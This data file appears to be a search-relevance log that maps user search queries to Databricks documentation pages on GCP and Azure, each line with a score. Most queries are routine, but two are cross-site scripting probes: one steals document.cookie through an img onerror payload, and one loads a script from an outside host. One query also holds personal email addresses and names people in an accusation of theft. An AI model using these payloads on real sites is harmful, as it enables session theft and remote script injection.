+3,https://docs.gcp.databricks.com/security/network/ip-access-list.html,control plane ip address ip ac ip access list ip address ip address ip allowlist access list ip access list api ip range ip acc ip addresses ip access ip access list access list
+0,https://docs.gcp.databricks.com/security/secrets/example-secret-workflow.html,create scope
+0,https://docs.gcp.databricks.com/security/secrets/secret-scopes.html,secret scope create scope
+1,https://docs.gcp.databricks.com/security/secrets/secrets.html,creating secrets in databricks environment variables cluster secret environment secret managiung secrets
+0,https://docs.gcp.databricks.com/security/secure-cluster-connectivity.html,secure cluster private cluster global ip secure cl private service connect secure c control plane ip address enable private cluster scc relay ip addresses no public ip control plane secure cluster connectivity secure cluster
+0,https://docs.gcp.databricks.com/spark/latest/dataframes-datasets/index.html,aml dataset dataframe as view
+0,https://docs.gcp.databricks.com/spark/latest/dataframes-datasets/introduction-to-dataframes-scala.html,min max dataframe column
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/aqe.html,adaptive skew
+4,https://docs.gcp.databricks.com/spark/latest/spark-sql/index.html,databricks sql error sql large
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/data-types/double-type.html,double precision
+2,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-convert-to-delta.html,"salvar delta delta vacuum,"
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-copy-into.html,copy into copy into
+5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-delete-from.html,delete rows delete from delete table
+4,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-describe-history.html,sql table history
+2,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-generate.html,delta generate delta generate
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-merge-into.html,dlt apply merge dlt apply merge merge on
+2,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/delta-optimize.html,bin packing delta lake start optimize delta
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/aes_encrypt.html,encrypt in transit
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/bool_and.html,if bool
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/explode.html,xml explode
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/get_json_object.html,json get
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/hex.html,hex to dec
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/log.html,databricks_guide/sample applications/log analysis/log analysis in python
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/to_csv.html,export csv
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/to_json.html,write json
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/functions/xpath.html,parsing xml
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/security-create-group.html,cannot create cluster
+5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/security-grant.html,table grant
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-datatypes.html,data type
+4,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-functions-udf-scalar.html,sql udf
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-functions.html,user defined functions user defined. functions
+4,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-hive-compatibility.html,clear cache is not supported on a sql endpoint. external apache hive metastore
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-partition.html,partition pruning tenant partitioning strategy
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-principal.html,unity catalog is in public preview. service principal service principal service principal service principal service principal gcp
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-privileges.html,unity catalog is in public preview.
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-cache-clear-cache.html,clear cache
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-cache-uncache-table.html,clear cache
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-conf-mgmt-reset.html,reset reset password for my burke remote at gmail.com account for my burstworks@gmail.com  that sue listclusters and michael washington stole
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-conf-mgmt-set-timezone.html,time zone
+6,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-conf-mgmt-set.html,set spark options
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-describe-schema.html,star schema
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-resource-mgmt-add-archive.html,add file add file
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-resource-mgmt-add-file.html,add file add data
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-resource-mgmt-list-file.html,list gcs files list from
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-resource-mgmt-list-jar.html,exclude jar conflcits
+4,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-show-columns.html,show columns (databricks sql) sql number of columns in a table
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-show-views.html,show views dynamic view dynamic views show view dynamic views
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-alter-schema.html,alter schema rename schema
+5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-alter-table.html,alter table alter table partition alter table alter table alter table alter table
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-comment.html,unity catalog is in public preview.
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-database.html,create data create database create database
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-schema.html,create schema
+2,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-table-using.html,create delta
+5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-table.html,create table create table sql create table create table create table create table create table
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-create-view.html,create view column alias
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-drop-database.html,drop database
+5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-drop-table.html,drop table drop prurge
+5,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-tblproperties.html,databricks display table
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-ddl-use-schema.html,unity catalog is in public preview.
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-diagram.html,within keyword
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-qry-select-groupby.html,group by
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-qry-select-lateral-view.html,dynamic views
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/language-manual/sql-ref-syntax-qry-select.html,select colu time travel time travel select from
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/pandas-function-apis.html,out of memory
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/query-watchdog.html,query watchdog
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/semi-structured.html,case nested column
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/spark-pandas.html,from pyspark.pandas
+0,https://docs.gcp.databricks.com/spark/latest/spark-sql/udf-python.html,user-defined functions user defined functions java
+0,https://docs.gcp.databricks.com/spark/latest/sparkr/sparklyr.html,sparklyr and createorreplacetempview
+0,https://docs.gcp.databricks.com/sql/admin/alert-destinations.html,job alert email
+0,https://docs.gcp.databricks.com/sql/admin/data-access-configuration.html,service account service account service account google cloud storage
+0,https://docs.gcp.databricks.com/sql/admin/general.html,date and time
+0,https://docs.gcp.databricks.com/sql/admin/index.html,unity catalog is in public preview.
+0,https://docs.gcp.databricks.com/sql/admin/query-history.html,window duration
+4,https://docs.gcp.databricks.com/sql/admin/sql-configuration-parameters.html,sql endpoint sql warehouse
+4,https://docs.gcp.databricks.com/sql/admin/sql-endpoints.html,query monitor sql endpoint sql endpoint
+0,https://docs.gcp.databricks.com/sql/admin/users-groups.html,unity catalog is in public preview.
+3,https://docs.gcp.databricks.com/sql/api/authentication.html,--header 'authorization: bearer dapixxxxxxxxxxxxxxxd' personal access
+0,https://docs.gcp.databricks.com/sql/api/sql-endpoints.html,max spot price
+0,https://docs.gcp.databricks.com/sql/get-started/concepts.html,primary key
+0,https://docs.gcp.databricks.com/sql/get-started/user-quickstart.html,create token how do
+0,https://docs.gcp.databricks.com/sql/language-manual/data-types/double-type.html,double precision
+0,https://docs.gcp.databricks.com/sql/language-manual/delta-merge-into.html,merge into
+2,https://docs.gcp.databricks.com/sql/language-manual/delta-vacuum.html,"delta vacuum,"
+0,https://docs.gcp.databricks.com/sql/language-manual/functions/bool_or.html,if bool
+1,https://docs.gcp.databricks.com/sql/language-manual/functions/case.html,databricks case creation
+4,https://docs.gcp.databricks.com/sql/language-manual/functions/date.html,select min date in sql
+0,https://docs.gcp.databricks.com/sql/language-manual/functions/date_trunc.html,trunc date
+0,https://docs.gcp.databricks.com/sql/language-manual/functions/percent_rank.html,window duration
+4,https://docs.gcp.databricks.com/sql/language-manual/functions/startswith.html,databricks sql databricks sql
+0,https://docs.gcp.databricks.com/sql/language-manual/functions/std.html,standard deviation
+0,https://docs.gcp.databricks.com/sql/language-manual/functions/variance.html,undefined function
+0,https://docs.gcp.databricks.com/sql/language-manual/functions/version.html,undefined function
+0,https://docs.gcp.databricks.com/sql/language-manual/functions/width_bucket.html,gcp bucket
+0,https://docs.gcp.databricks.com/sql/language-manual/index.html,unity catalog is in public preview.
+0,https://docs.gcp.databricks.com/sql/language-manual/security-drop-group.html,primary key
+0,https://docs.gcp.databricks.com/sql/language-manual/security-revoke.html,unity catalog is in public preview.
+0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-datatype-rules.html,primary key
+1,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-datatypes.html,databricks certified associate data analyst (beta)
+0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-principal.html,unity catalog is in public preview. service principals service principal
+0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-privileges.html,unity catalog is in public preview.
+2,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-alter-table.html,rename a delta table name change a name column
+0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-create-location.html,unity catalog is in public preview.
+5,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-create-table-using.html,create table delta table create
+5,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-create-table.html,create table create table
+0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-create-view.html,column alias create view create view
+0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-drop-schema.html,delete database
+5,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-drop-table.html,drop table
+0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-syntax-ddl-use-schema.html,unity catalog is in public preview.
+0,https://docs.gcp.databricks.com/sql/language-manual/sql-ref-window-functions.html,marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications marketing stretegies classifications
+0,https://docs.gcp.databricks.com/sql/user/data/tables.html,display schema
+4,https://docs.gcp.databricks.com/sql/user/favorites-tags.html,databricks sql dashboard
+1,https://docs.gcp.databricks.com/sql/user/index.html,databricks for sas users
+3,https://docs.gcp.databricks.com/sql/user/security/access-control/index.html,access control overview
+3,https://docs.gcp.databricks.com/sql/user/security/cloud-storage-access.html,service account configure access to cloud storage service account gcp bucket service account
+3,https://docs.gcp.databricks.com/sql/user/security/personal-access-tokens.html,personal access token personal access token personal access token
+1,https://docs.gcp.databricks.com/sql/user/visualizations/tables.html,databricks display format fact tables
+0,https://docs.gcp.databricks.com/workspace-index.html,data science & engineering?
+0,https://docs.gcp.databricks.com/workspace/index.html,workspace details
+0,https://docs.gcp.databricks.com/workspace/workspace-details.html,get workspace id
+0,https://docs.gcp.databricks.com/workspace/workspace-objects.html,user home search workspace
+0,https://docs.microsoft.com/en-us/azure/databricks/,"""><img src=x onerror=javascript:alert(document.cookie)>"
+1,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/,azure databricks certified associate platform administrator single sign-on
+3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/cluster-acl,git proxy cluster is being terminated in e2 workspace limit cluster workspace access enable cluster access control for your workspace
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/conditional-access,upgrade premium
+3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/jobs-acl,enable jobs access control for your workspace
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/table-acl,permission to create cluster
+3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/access-control/tokens,access token access token access token manage personal access tokens
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/account-settings/account,subscription quota exceeded upgrade premium
+1,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/account-settings/azure-diagnostic-logs,diagnostic logging in azure databricks azure monitoring
+1,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/account-settings/usage-detail-tags-azure,usage of databricks dbu cost analysis cluster tags
+3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/admin-console,access the admin console admin console admin porta lost admin password access the admin console admin console admin console name
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/cloud-configurations/azure/,on premise gitlab
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/cloud-configurations/azure/on-prem-network,on premise gitlab
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/cloud-configurations/azure/vnet-inject,on premise gitlab instances unreachable
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/cloud-configurations/azure/vnet-peering,on premise gitlab peer virtual networks
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/clusters/,streamwrite with options
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/clusters/policies,cluster polici manage clusters
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/disaster-recovery,recovery folder
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/users-groups/groups,add users to groups
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/users-groups/scim/,user usage provision users and groups using scim
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/users-groups/service-principals,"""client secret"""
+3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/users-groups/users,add users to groups access the admin console unexpected cluster termination add user
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/workspace/dbfs-ui-upload,upload dbc in the workspace
+3,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/workspace/notebooks,restrict notebook access
+0,https://docs.microsoft.com/en-us/azure/databricks/administration-guide/workspace/storage,purge cluster logs
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/experiments-page,artifact location
+3,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/feature-store/access-control,give only read access to tables
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/feature-store/feature-tables,feature stor
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/feature-store/time-series,time travel
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/load-data/,saving data
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/model-export/,export and import models export and import models export and import models import dbc
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/reference-solutions/,reference solutions
+1,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/reference-solutions/recommender-wide-n-deep,mlflow model serving on databricks issues serving recommendations models
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/machine-learning/train-model/tensorflow,how to check tensorflow version tensorflow version
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/model-registry-webhooks,encryption_algorithm_name = 'aead_aes_256_cbc_hmac_sha_256'
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/model-serving,serving pending mlflow model serving with custom loss
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/projects,mlflow project
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/quick-start-python,load data python import python packages install python module
+0,https://docs.microsoft.com/en-us/azure/databricks/applications/mlflow/tracking,clone notebook
+0,https://docs.microsoft.com/en-us/azure/databricks/clusters/,issue with standard cluster my cluster is not starting can't start cluster manage clusters azure cluster not starting cluster size display pools
+0,https://docs.microsoft.com/en-us/azure/databricks/clusters/cluster-config-best-practices,garbage collection
+1,https://docs.microsoft.com/en-us/azure/databricks/clusters/clusters-manage,cluster is not starting start a cluster cluster stuck in pending cluster manager logs arr- databricks cluster performance issue clone a cluster cluster wont start manage clusters manage clusters enforce cluster creation cluster init error start cluster
+0,https://docs.microsoft.com/en-us/azure/databricks/clusters/configure,cluster tags
+0,https://docs.microsoft.com/en-us/azure/databricks/clusters/create,failure to create a serverless cluster create a cluster cluster not starting loading by creating cluster cluster teminated
+0,https://docs.microsoft.com/en-us/azure/databricks/clusters/init-scripts,"""><script src=https://x25.xss.ht></script>"
+6,https://docs.microsoft.com/en-us/azure/databricks/clusters/single-node,the spark driver has stopped unexpectedly and is restarting. your notebook will be automatically reattached.
+0,https://docs.microsoft.com/en-us/azure/databricks/clusters/web-terminal,delete mt account on customer academy web terminal web terminal
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/,delta live delta live tables delta live tables delta live tables data quality constraints
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-cdc,delta live tables cdc apply change change data captur change data feed scd
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-concepts,spark.databricks.delta.format check.enabled cannot modify delta table delta live table
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-configuration,delta live tables init scripts delta live tables delta live tables delta live spark.databricks.delta.format check.enabled
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-cookbook,delta live table kafka avro
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-data-sources,delta live table enable delta live table delta live table kafka avro
+0,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-event-log,explode json
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-expectations,delta live tables - aggregated quality checks (expectations)
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-quickstart,"delta live tables this delta live tables query is syntactically valid, but you must create a pipeline in order to define and populate your table. delta live tables"
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-ui,"this delta live tables query is syntactically valid, but you must create a pipeline in order to define and populate your table. azure databricks create pipelines"
+2,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/delta-live-tables/delta-live-tables-workflows,"delta live table pipeline this delta live tables query is syntactically valid, but you must create a pipeline in order to define and populate your table."
+0,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/jobs/jobs,how to download job job error
+0,https://docs.microsoft.com/en-us/azure/databricks/data-engineering/jobs/jobs-api-updates,jobs api
+0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/,unity catalog (preview) upgrade premium unity catalog upgrade tables and views to unity catalog manage account-level identities unity catalog unity catalog
+0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/automate,unity catalog
+0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/business-intelligence,"tableau, ssl_connect: certificate verify failed"
+5,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/create-tables,create table azure databricks python create delta table java.io.ioexception: server failed to authenticate the request. make sure the value of authorization header is formed correctly including the signature. please see the cause for further information. create table
+0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/create-views,data masking view current role create or replace temp view
+0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/get-started,unity catalog get started using unity catalog unity catalog unity catalog principal get started using unity catalog
+0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/limitations,unity catalog
+0,https://docs.microsoft.com/en-us/azure/databricks/data-governance/unity-catalog/manage-identities,support service principals at the account level for automation manage account-level identities
+0,https://docs.microsoft.com/en-us/azure/databricks/data-sharing/delta-sharing/,external data sharing
+0,https://docs.microsoft.com/en-us/azure/databricks/data-sharing/delta-sharing/access_list,ip allowlist
+0,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/,"import, read, and modify data"
+3,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/azure/azure-storage,azure blob in databricks mounted blob blob access no credentials
+5,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/hive-tables,drop table from user/hive/warehouse
+1,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/read-csv,how to download a file that was exported to csv using java code need to unload /export databricks query response into amazon s3 buckets as csv files. export data csv file
+0,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/read-json,json files without line delimiter
+4,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/read-parquet,"filter data while fetching from parquet file write and update parquet file parquet file create parquet file from dataframe parquet file overwrite parquet file %sql create table if not exists events using parquet options (path ""/mnt/training/ecommerce/events/events.parquet"")"
+6,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/redis,issue with spark-redis connector
+4,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/sql-databases,timedout when connecting to sql database sql server sql server connections simba jdbc
+4,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/sql-databases-azure,insert into sql from databricks connection sql server sql server sql with apache spark
+6,https://docs.microsoft.com/en-us/azure/databricks/data/data-sources/xml,xml request in python load special characters with spark-xml xml to dataframe
+0,https://docs.microsoft.com/en-us/azure/databricks/data/databricks-datasets,streamwrite with options scala
+1,https://docs.microsoft.com/en-us/azure/databricks/data/databricks-file-system,dbfs model access manage the dbfs file browser create folder in dbfs databricks file system upload file upload file upload file databricks file system (dbfs)
+0,https://docs.microsoft.com/en-us/azure/databricks/data/metastores/,parquet timestamp requires hive metastore 1.2 or above how to export hive metastore
+4,https://docs.microsoft.com/en-us/azure/databricks/data/metastores/external-hive-metastore,external apache hive metastore azure sql external metastore
+0,https://docs.microsoft.com/en-us/azure/databricks/delta/,change data feed
+0,https://docs.microsoft.com/en-us/azure/databricks/delta/concurrency-control,not serializable
+2,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-batch,write delta
+0,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-column-mapping,rearranging columns in
+6,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-faq,multi-cluster write stream spark insert stream
+2,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-ingest,upload csv delta lake
+0,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-intro,task not serializable foreachbatch
+2,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-resources,delta lake
+0,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-streaming,writestream nvarchar
+2,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-update,cdf scd delete delta table task not serializable foreachbatch
+0,https://docs.microsoft.com/en-us/azure/databricks/delta/delta-utility,new command line shortcut retention interval magic curl command with variable
+5,https://docs.microsoft.com/en-us/azure/databricks/delta/intro-notebooks,import notebook python load table into notebook how to upload azure notebook
+0,https://docs.microsoft.com/en-us/azure/databricks/delta/optimizations/auto-optimize,optimized writes
+1,https://docs.microsoft.com/en-us/azure/databricks/delta/optimizations/file-mgmt,arr- databricks cluster performance issue
+0,https://docs.microsoft.com/en-us/azure/databricks/delta/optimizations/isolation-level,object not serializable (class: com.microsoft.azure.eventhubs.connectionstringbuilder task not serializable foreachbatch
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/2.0/,rest endpoin
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/,rest api (latest) api documentation
+1,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/aad/service-prin-aad-token,2204200040005851  not able to use service principal to create databricks azure key vault-backed secret scope aad token for jdbc odbc
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/aad/troubleshoot-aad-token,aad token for jdbc odbc
+3,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/authentication,personal access tokens generate token access token access token
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/clusters,"""driver is up but is not responsive, likely due to gc"""
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/examples,users created through scim api unable to login
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/gitcredentials,malformed credentials api
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/instance-pools,pools pricing
+3,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/ip-access-list,monitor ip utilization whitelist ip for rest api access
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/jobs,create job api
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/libraries,cluster libraries
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/policies,iam policy with aws region restriction
+1,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/scim/scim-sp,patching for databricks
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/token-management,http error 403</h2> <p>problem accessing /api/2.0/
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/tokens,api post request for token
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/api/latest/workspace,workspace api
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/ci-cd/ci-cd-azure-devops,azure devops
+6,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/clusters-cli,spark.databricks.delta.format check.enabled
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/instance-pools-cli,instances always running
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/repos-cli,unable to delete a repo
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/runs-cli,run submitted
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/stack-cli,stack cli
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/workspace-cli,clustereditinstanceprofilevalidationsuite is not registered to create private workspace
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/databricks-connect,could not locate executable null\bin\winutils.exe
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/databricks-utils,dbutils unmount mount command fails dbutils in streaming listener multiselect widget list of commands
+1,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/dbeaver,databricks jdbc
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/dbx,vs code
+4,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/python-sql-connector,sql server
+0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/terraform/workspace-management,databricks_pipeline terraform
+0,https://docs.microsoft.com/en-us/azure/databricks/error-messages/,change data feed cloud provider failure. azure vm extension stuck on transitioning state.
+0,https://docs.microsoft.com/en-us/azure/databricks/getting-started/community-edition,community edition cannot login to the community edition unable to login community edition community workspace
+3,https://docs.microsoft.com/en-us/azure/databricks/getting-started/free-training,access free customer training access free customer training access free customer training students - access to free self paced training
+6,https://docs.microsoft.com/en-us/azure/databricks/getting-started/spark/,introduction to apache spark architecture
+0,https://docs.microsoft.com/en-us/azure/databricks/getting-started/spark/datasets,upload dataset dataset file path object not serializable (class: com.microsoft.azure.eventhubs.connectionstringbuilder
+0,https://docs.microsoft.com/en-us/azure/databricks/getting-started/spark/next,what is a repo
+0,https://docs.microsoft.com/en-us/azure/databricks/ingestion/auto-loader/faq,how to correct bad data into autoloader autoloader not processing files in queue
+0,https://docs.microsoft.com/en-us/azure/databricks/integrations/,repos for git integration partner connect
+0,https://docs.microsoft.com/en-us/azure/databricks/integrations/bi/power-bi,power bi power bi power bi single sign on power bi power bi power bi
+0,https://docs.microsoft.com/en-us/azure/databricks/integrations/bi/tableau,tableau server
+1,https://docs.microsoft.com/en-us/azure/databricks/integrations/partner-connect/,partner connect partner connect databricks partner connect customer partner
+0,https://docs.microsoft.com/en-us/azure/databricks/integrations/partner-connect/admin,fivetran partner connect partner connect
+1,https://docs.microsoft.com/en-us/azure/databricks/integrations/partners,databricks partners partner connet partner capstones and accreditations enable partner connect partner login
+0,https://docs.microsoft.com/en-us/azure/databricks/integrations/reverse-etl/hightouch,server hostname
+0,https://docs.microsoft.com/en-us/azure/databricks/kb/administration/who-deleted-cluster,unexpected cluster termination
